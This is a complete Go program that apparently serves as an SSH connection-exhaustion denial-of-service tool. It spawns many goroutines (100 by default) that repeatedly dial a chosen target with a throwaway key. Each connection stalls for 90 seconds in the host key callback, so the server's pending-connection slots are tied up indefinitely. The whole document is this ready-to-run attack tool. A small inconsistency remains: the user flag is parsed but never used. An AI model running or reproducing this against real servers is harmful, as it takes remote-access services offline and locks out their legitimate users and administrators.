package main

import (
	"crypto/ed25519"
	"crypto/rand"
	"flag"
	"log"
	"net"
	"strings"
	"time"

	"golang.org/x/crypto/ssh"
)

func genkey() (ssh.Signer, error) {
	_, priv, err := ed25519.GenerateKey(rand.Reader)
	if err != nil {
		return nil, err
	}

	return ssh.NewSignerFromKey(priv)
}

func idle(id int, host string, config *ssh.ClientConfig) {
retry:
	log.Println("Runner", id, "connecting...")
	ssh.Dial("tcp", host, config)
	time.Sleep(time.Millisecond * 250)
	goto retry
}

func main() {
	var target, user string
	var connections int
	flag.IntVar(&connections, "c", 100, "number of connections to initiate")
	flag.StringVar(&target, "t", "", `target "host" or "host:port"`)
	flag.StringVar(&user, "u", "root", `user to ssh as; probably doesn't matter`)
	flag.Parse()

	if target == "" {
		log.Fatal("-t argument required")
	}
	if !strings.Contains(target, ":") {
		target += ":22"
	}

	signer, err := genkey()
	if err != nil {
		log.Fatal(err)
	}
	config := &ssh.ClientConfig{
		User: "root",
		Auth: []ssh.AuthMethod{
			ssh.RetryableAuthMethod(ssh.PublicKeys(signer), 2),
		},
		HostKeyCallback: func(string, net.Addr, ssh.PublicKey) error { time.Sleep(time.Second * 90); return nil },
	}

	for i := 0; i < connections; i++ {
		go idle(i, target, config)
	}

	select {}
}
